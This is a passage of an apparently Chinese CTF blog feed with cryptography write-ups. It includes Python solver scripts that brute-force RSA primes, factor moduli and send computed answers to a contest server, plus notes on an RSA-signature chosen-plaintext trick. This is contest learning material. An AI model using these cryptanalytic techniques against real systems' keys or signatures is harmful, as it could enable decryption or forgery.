class="string">b&#x27;kgsekWGeAwPhz6tbMyLd34Bg5pwhy2TkQJF7NRYC987Ibuiu/dmNHqyYXHV0kXlksThSRi83Qu2owAiUdT9pfqlY&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;IQPhJuaTSjms0snUwrXJjw7cQ0m3OwVzqQzhGej+A7J28tdoUaeokeQgDHhfokZEDJyectu/1x45ieK7YgHjS0LZkddFEn7jui8BQYM8BaIDrSYQ3dC36RUKYiZ6bg==&#x27;</span></span><br><span class="line">encrypted_password = base64.b64decode(encrypted_password)</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line"><span class="comment"># password = decrypt(encrypted_password)</span></span><br><span class="line">nonce1 = encrypted_password[:<span class="number">8</span>]</span><br><span class="line">nonce2 = c[:<span class="number">8</span>]</span><br><span class="line">encrypted_password = encrypted_password[<span class="number">8</span>:]</span><br><span class="line">c = c[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># encryption_key = BLAKE2s.new(data=PASSWORD + b&#x27;encryption_key&#x27;).digest()</span></span><br><span class="line"><span class="comment"># mac_key = BLAKE2s.new(data=PASSWORD + b&#x27;mac_key&#x27;).digest()</span></span><br><span class="line">mac_key = <span class="string">b&#x27;123456&#x27;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>不会啊，等WP就鸽了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210911 GWHTCrypto方向部分WP</title>
    <url>/posts/b13b0850/</url>
    <content><![CDATA[<p>广外女生战队出的题，没什么大战队，都在RCTF那边</p>
<p>密码怎么说，换成OSINT更好？</p>
<span id="more"></span>

<h1 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h1><h2 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h2><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210911162154426.png" alt="image-20210911162154426"></p>
<p>题目意思很简单，要找出100组$a^4+b^4+c^4+d^4=e^2$的解，并且有一定的限制，比如不能有0，完全相同的解不能重复，但是允许交换顺序</p>
<p>但条件相对虎符的那一道题已经相当宽泛了，有空去研究下那道<a href="https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/index.html">cubic</a></p>
<p>此外，这个等式的解也并不是像<a href="https://zhuanlan.zhihu.com/p/33853851">史上最贱的数学题</a>那样难找，还是挺多的，稍微控制了下循环的参数，再加上可以排列组合，直接brute-force了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 192.168.39.3 2378</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product, permutations</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> hexdigits</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">space = hexdigits[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;192.168.39.3&#x27;</span>, <span class="number">2378</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    <span class="comment"># Please find a string that md5(str + 848e)[0:5] == c04dd</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = proof[<span class="number">36</span>:<span class="number">40</span>].decode()</span><br><span class="line">    HASH5 = proof[<span class="number">50</span>:<span class="number">55</span>].decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">6</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = md5((head+tail).encode()).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> t == HASH5:</span><br><span class="line">            sh.recvuntil(<span class="string">b&#x27;[&gt;] Give me xxxxx: &#x27;</span>)</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># Please find a string that md5(str + 848e)[0:5] == c04dd</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = <span class="string">&#x27;cdc3&#x27;</span></span><br><span class="line">    HASH5 = <span class="string">&#x27;ae696&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">6</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = md5((head+tail).encode()).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> t == HASH5:</span><br><span class="line">            <span class="built_in">print</span>(head)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m, n = [], []</span><br><span class="line"><span class="keyword">for</span> n1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> n2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">for</span> n3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">            <span class="keyword">for</span> n4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">                <span class="keyword">if</span> iroot(n1**<span class="number">4</span>+n2**<span class="number">4</span>+n3**<span class="number">4</span>+n4**<span class="number">4</span>, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">                    n.append([n1, n2, n3, n4])</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(n) == <span class="number">14</span>:</span><br><span class="line">                        <span class="comment"># permutations</span></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">                            <span class="keyword">for</span> j <span class="keyword">in</span> permutations(i, <span class="number">4</span>):</span><br><span class="line">                                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> m:</span><br><span class="line">                                    m.append(j)</span><br><span class="line">                        <span class="keyword">assert</span> <span class="built_in">len</span>(m) &gt;= <span class="number">100</span></span><br><span class="line">                        m = m[:<span class="number">100</span>]</span><br><span class="line">                        proof_of_work()</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] a:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">0</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] b:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">1</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] c:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">2</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] d:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(i[<span class="number">3</span>]).encode())</span><br><span class="line">                            sh.recvuntil(<span class="string">b&#x27;[&gt;] e:&#x27;</span>)</span><br><span class="line">                            sh.sendline(<span class="built_in">str</span>(iroot(i[<span class="number">0</span>]**<span class="number">4</span>+i[<span class="number">1</span>]**<span class="number">4</span>+i[<span class="number">2</span>]**<span class="number">4</span>+i[<span class="number">3</span>]**<span class="number">4</span>, <span class="number">2</span>)[<span class="number">0</span>]).encode())</span><br><span class="line">                            sh.recvline()</span><br><span class="line">                        flag = sh.recvline()</span><br><span class="line">                        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>脚本写的还是挺丑</p>
<h2 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h2><p>给了两个n，隐晦地表达模数之间有公因子，分解下，来两次传统手艺就好，没什么说的</p>
<h2 id="MISS（osint）"><a href="#MISS（osint）" class="headerlink" title="MISS（osint）"></a>MISS（osint）</h2><p>emmmm有点拉垮，github上找到原题，exp都不用改<br><a href="https://github.com/Mathsyo/CTFs/tree/2630cdb64799774020d32107ff0ebcf269c64535/MidnightFlagCTF/Cryptography/Something_missing">https://github.com/Mathsyo/CTFs/tree/2630cdb64799774020d32107ff0ebcf269c64535/MidnightFlagCTF/Cryptography/Something_missing</a></p>
<p>自从上次YauzaCTF跟着OSINT师傅玩了下，发现github真的是好东西</p>
<p>比赛结束研究下考点</p>
<h2 id="Rsa-（unsolved）"><a href="#Rsa-（unsolved）" class="headerlink" title="Rsa?（unsolved）"></a>Rsa?（unsolved）</h2><p>库鲁西，十几个人解出来了</p>
<p>关键信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xy = <span class="keyword">lambda</span> (x1,y1),(x2,y2): ((x1*x2+D*y1*y2)%n, (x1*y2+x2*y1)%n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getloop</span>(<span class="params">(<span class="params">x,y</span>), e</span>):</span></span><br><span class="line">	ret = (x, y)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e-<span class="number">1</span>):</span><br><span class="line">		ret = xy(ret, (x,y))</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line"><span class="built_in">print</span> getloop((X, Y), e)</span><br></pre></td></tr></table></figure>

<p>$Z_1\equiv_n M_x*M_y$<br>$X\equiv_n (Z_1+Z_1^{-1})\times 2^{-1}$<br>$a\equiv_n(Z1^{-1}-X)*Y^{-1}$<br>$D\equiv_n a^2$</p>
<p>只知道a和n，然后getloop迭代了65536次的（X，Y），Y就是My</p>
<p>显然只要知道Z1，就能全部推导出来</p>
<p>然后<code>getloop</code>这个函数里面，很像杨辉三角里的东西，但循环结束算出的$x+y$和$(X+aY)^{65537}\ mod\ n$直接还是有区别</p>
<p>不过进一步推导下，$X+aY=X+Z_1^{-1}-X=Z_1^{-1}$，后面可能就是求得对$(Z_1^{-1})^{65537}\ mod\ n$进行的加密，但是n分解不了，库鲁西</p>
<p>记录几组坐标</p>
<ol start="0">
<li><p>$(x,\ y)$</p>
</li>
<li><p>$(x^2+Dy^2,\ 2xy)$</p>
</li>
<li><p>$(x^3+3Dy^2x,\ 3x^2y+Dy^3)$</p>
</li>
<li><p>$(x^4+6Dx^2y^2+D^2y^4,\  4x^3y+4Dy^3x)$</p>
</li>
<li><p>$(x^5+10Dx^3y^2+5D^2y^4x,\ 5x^4y+10Dy^3x^2+D^2y^5)$</p>
</li>
<li><p>$(x^6+15Dx^4y^2+15Dy^4x^2+D^3y^6,\ 6x^5y+20Dx^3y^3+6D^2y^5x)$</p>
<p> $\vdots$</p>
</li>
</ol>
<p>0x10001. $(x^{65537}+\cdots,\ \cdots +D^{32768}y^{65537})$</p>
<p>变成x+y呢<br>$$<br>x+y\notag<br>$$<br>$$<br>x^2+2xy+Dy^2\notag<br>$$<br>$$<br>x^3+3x^2y+3Dy^2x+Dy^3\notag<br>$$<br>$$<br>x^4+4x^3y+6Dx^2y^2+4Dy^3x+D^2y^4\notag<br>$$<br>$$<br>x^6+6x^5y+15Dx^4y^2+20Dx^3y^3+15Dy^4x^2\notag+6D^2y^5x+D^3y^6<br>$$<br>$$<br>\vdots\notag<br>$$<br>简化成杨辉三角的模式<br>$$<br>1\notag<br>$$<br>$$<br>1\ 1\notag<br>$$<br>$$<br>1\ 2\ D\notag<br>$$<br>$$<br>1\ 3\ 3D\ D\notag<br>$$<br>$$<br>1\ 4\ 6D\ 4D\ D^2\notag<br>$$<br>$$<br>1\ 6\ 15D\ 20D\ 15D\ 6D^2\ D^3\notag<br>$$<br>$$<br>\vdots\notag<br>$$<br>似乎有什么规律，D用a来代呢</p>
<ol>
<li><p>$(x,\ y)$</p>
</li>
<li><p>$(x^2+a^2y^2,\ 2xy)$</p>
</li>
<li><p>$(x^3+3a^2y^2x,\ 3x^2y+a^2y^3)$</p>
</li>
<li><p>$(x^4+6a^2x^2y^2+a^4y^4,\  4x^3y+4a^2y^3x)$</p>
</li>
<li><p>$(x^5+10a^2x^3y^2+5a^4y^4x,\ 5x^4y+10a^2y^3x^2+a^4y^5)$</p>
</li>
<li><p>$(x^6+15a^2x^4y^2+15a^2y^4x^2+a^6y^6,\ 6x^5y+20a^2x^3y^3+6a^4y^5x)$</p>
<p>$\vdots$</p>
</li>
</ol>
<p>$$<br>x+y\notag<br>$$<br>$$<br>x^2+2xy+a^2y^2\notag<br>$$<br>$$<br>x^3+3x^2y+3a^2y^2x+a^2y^3\notag<br>$$<br>$$<br>x^4+4x^3y+6a^2x^2y^2+4a^2y^3x+a^4y^4\notag<br>$$<br>$$<br>x^6+6x^5y+15a^2x^4y^2+20a^2x^3y^3+15a^2y^4x^2+6a^4y^5x+a^6y^6\notag<br>$$<br>$$<br>\vdots\notag<br>$$</p>
<p>$$<br>(x+ay)^1-(a-1)y\notag<br>$$<br>$$<br>(x+ay)^2-2(a-1)xy\notag<br>$$<br>$$<br>(x+ay)^3-(a^2-1)y^3-(3a^3-1)y^2x\notag<br>$$</p>
<p>越搞越乱，如果flag是和<code>flag = &quot;GWHT&#123;xxxxxxxxx&#125;&quot;</code>所说的一样长，那么Y是要比X小很多的</p>
<p>有师傅解出来了，转换成分数的形式我不知道严不严谨，后面还是主要能找到规律吧<br><a href="https://blog.csdn.net/qq_36489548/article/details/120262846">https://blog.csdn.net/qq_36489548/article/details/120262846</a></p>
<h2 id="Easy-Rsa（osint）"><a href="#Easy-Rsa（osint）" class="headerlink" title="Easy_Rsa（osint）"></a>Easy_Rsa（osint）</h2><p>来看生成p和q的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gamma = 0.48</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    <span class="comment"># 491</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    <span class="comment"># 0.02</span></span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 20</span></span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure>

<p>又是原题，直接打，<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</a>，la佬的博客都借鉴这位师傅的</p>
<p>不过确实挺好奇是怎么出的，照例原题赛后复现，因为完全可以赛前就做到，没必要比赛时研究</p>
<h2 id="Think-about-it（unsolved）"><a href="#Think-about-it（unsolved）" class="headerlink" title="Think about it（unsolved）"></a>Think about it（unsolved）</h2><p>一道逆向题，可以看出其中包含了SM4，但是伪代码还是看不懂</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉没怎么动脑子，总共六道密码题，两道水题，两道原题，一道没想通，一道看不懂伪代码</p>
<p>还是做得不愉快啊</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>RSA LSB</tag>
      </tags>
  </entry>
  <entry>
    <title>20210919 长城杯Crypto方向WP</title>
    <url>/posts/d98f7fed/</url>
    <content><![CDATA[<p>kw就这？没做过瘾啊，一道密码就离谱，这就去学pwn</p>
<span id="more"></span>

<h1 id="长安杯"><a href="#长安杯" class="headerlink" title="长安杯"></a>长安杯</h1><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h2><p>第四个解出来，可惜差一点抢血。虽然过程很懵，但是做出来后觉得是好题，emmmmm还好吧，有点小隐晦，凭感觉打</p>
<p>第一层难搞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, v1, v2, m1, m2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_1</span>(<span class="params">val</span>):</span></span><br><span class="line">    p, q = <span class="built_in">pow</span>(v1, (m1+<span class="number">1</span>))-<span class="built_in">pow</span>((v1+<span class="number">1</span>), m1), <span class="built_in">pow</span>(v2, (m2+<span class="number">1</span>))-<span class="built_in">pow</span>((v2+<span class="number">1</span>), m2)</span><br><span class="line">    <span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> (</span><br><span class="line">        p*q).bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q &lt; p &lt; q &lt;&lt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(val, <span class="number">0x10001</span>, p*q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">plain1 = bytes_to_long(flag[:<span class="number">21</span>])</span><br></pre></td></tr></table></figure>

<p>$$<br>\begin{align}<br>p=v_1^{m_1+1}-(v_1+1)^{m_1}\\<br>q=v_2^{m_2+1}-(v_2+1)^{m_2}<br>\end{align}<br>$$</p>
<p>他们没有告诉我们模数，搞怪吧；不过如果告诉模数了应该算简单题了，或许可以直接分解模数</p>
<p>又去网上搜了一波<code>RSA模数未知</code>，但确实应该没有，选择明文攻击条件不符</p>
<p>既然现有的RSA攻击模式走不通，就凭借感觉吧，我觉得这个<code>v1, v2, m1, m2</code>可爆，然后根据第二层，m很小不需要这么多模数（虽然不知道为什么第二层的x为什么还能分解，但是问题不大），只需要知道p就好了，然后记得v1确定之后框定一下m1的范围就很快可以爆破出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311</span></span><br><span class="line">c2 = (<span class="number">40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083</span>, <span class="number">43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269</span>, <span class="number">39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enc_2</span></span><br><span class="line">c2, n2, x = c2[<span class="number">0</span>], c2[<span class="number">1</span>], c2[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">assert</span> n2 % x == <span class="number">0</span></span><br><span class="line">n2 = x</span><br><span class="line">p1 = <span class="number">191</span></span><br><span class="line">p2 = <span class="number">193</span></span><br><span class="line">p3 = <span class="number">627383</span></span><br><span class="line">p4 = <span class="number">1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710491</span></span><br><span class="line">phi2 = (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>) * (p3 - <span class="number">1</span>) * (p4 - <span class="number">1</span>)</span><br><span class="line">d2 = invert(e, phi2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">flag2 = long_to_bytes(m2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enc_1</span></span><br><span class="line">lbound, ubound = <span class="number">2</span> ** <span class="number">1021</span>, <span class="number">2</span> ** <span class="number">1027</span></span><br><span class="line"><span class="keyword">for</span> v1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000000</span>):</span><br><span class="line">    <span class="keyword">for</span> m1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(log(lbound, v1)), <span class="built_in">int</span>(log(ubound, v1))):</span><br><span class="line">        p = <span class="built_in">pow</span>(v1, (m1 + <span class="number">1</span>)) - <span class="built_in">pow</span>((v1 + <span class="number">1</span>), m1)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> <span class="number">1021</span> &lt; p.bit_length() &lt; <span class="number">1027</span>:</span><br><span class="line">            phi1 = p - <span class="number">1</span></span><br><span class="line">            d1 = invert(e, phi1)</span><br><span class="line">            m = <span class="built_in">pow</span>(c1, d1, p)</span><br><span class="line">            <span class="keyword">if</span> long_to_bytes(m).startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                flag1 = long_to_bytes(m)</span><br><span class="line">                flag = flag1 + flag2</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="你这flag保熟吗"><a href="#你这flag保熟吗" class="headerlink" title="你这flag保熟吗"></a>你这flag保熟吗</h2><p>帮队友看题，看图形我记得在b站上看过一个up用计算机模拟二向箔二维化地球，用的就是希尔伯特曲线，有一部分原题改下脚本<a href="https://zhuanlan.zhihu.com/p/381863924">https://zhuanlan.zhihu.com/p/381863924</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210919140215766.png" alt="image-20210919140215766"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">filename = <span class="string">r&quot;password.xls&quot;</span></span><br><span class="line"><span class="comment"># xlrd操作xls文件</span></span><br><span class="line">excel = xlrd.open_workbook(filename)  <span class="comment"># 文件名以及路径，如果路径或者文件名有中文给前面加一个 r</span></span><br><span class="line"></span><br><span class="line">excel.sheet_names()  <span class="comment"># 获取excel里的工作表sheet名称数组</span></span><br><span class="line">sheet = excel.sheet_by_index(<span class="number">0</span>)  <span class="comment"># 根据下标获取对应的sheet表</span></span><br><span class="line"></span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    lis.append(sheet.row_values(index))</span><br><span class="line"></span><br><span class="line">arr = np.array(lis)</span><br><span class="line"></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">8</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x, y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += arr[y, x]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    s = b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1f_y0u_h4ve_7he_fllllllag,_I_muSt_vvant_1t!</p>
</blockquote>
<p>后面得到flag.php就没了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210908 人在寝室坐题从天上来疑似江西吉林省赛Crypto方向部分WP</title>
    <url>/posts/e245e3dc/</url>
    <content><![CDATA[<p>今天东北的师傅给了他们那边比赛的三密码道题，期间看了第一道，求出n之后就没思路了；还有两道赛后复现的，都是AES.CBC，第二道从尚师傅那里获得提示，跳开了CBC模式本身，攻击点在pad；第三道pad可以利用的点被抹除了，并给了一个看似需要攻击的地方，但攻击点却在CBC模式本身</p>
<p>好了，我宣布尚师傅最强，实验室密码顶梁柱，我就是尚师傅的WP手，专门记录尚师傅出过的题目</p>
<p>以及被IO支配的恐惧</p>
<span id="more"></span>

<h2 id="Yusa的日常生活—美国大选（recuring）"><a href="#Yusa的日常生活—美国大选（recuring）" class="headerlink" title="Yusa的日常生活—美国大选（recuring）"></a>Yusa的日常生活—美国大选（recuring）</h2><p>一开始只给了个nc，在Your vote后面输入一个十进制的数字，尝试复制上面的send过去，得到如下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210908123225549.png" alt="image-20210908123225549"></p>
<p>可以通过尝试看出e=3（依次send<code>1</code>,<code>2</code>,<code>3</code>这样一些比较小的数，得到的是各自立方转字节后的结果），猜测底层和RSA有关</p>
<p>后来才上了源码，关键的逻辑如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;Form of vote:&#123;voter&#125;:&#123;votee&#125;! eg: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Yusa:Trump!&quot;</span>)</span><br><span class="line">vote = <span class="built_in">pow</span>(bytes_to_long(<span class="string">b&quot;Yusa:Trump!&quot;</span>), d, p * q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vote:&quot;</span>, vote)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    yusa = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Your vote: &quot;</span>))</span><br><span class="line">    vote = long_to_bytes(<span class="built_in">pow</span>(yusa, e, p * q)).split(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(vote)</span><br><span class="line">    <span class="keyword">if</span> vote[-<span class="number">1</span>] == <span class="string">&quot;Trump!&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[:<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">elif</span> vote[-<span class="number">1</span>] == <span class="string">&quot;Biden!&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">10</span>:])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>

<p>RSA签名以及选择明文攻击，像下面这样可以搞出n来</p>
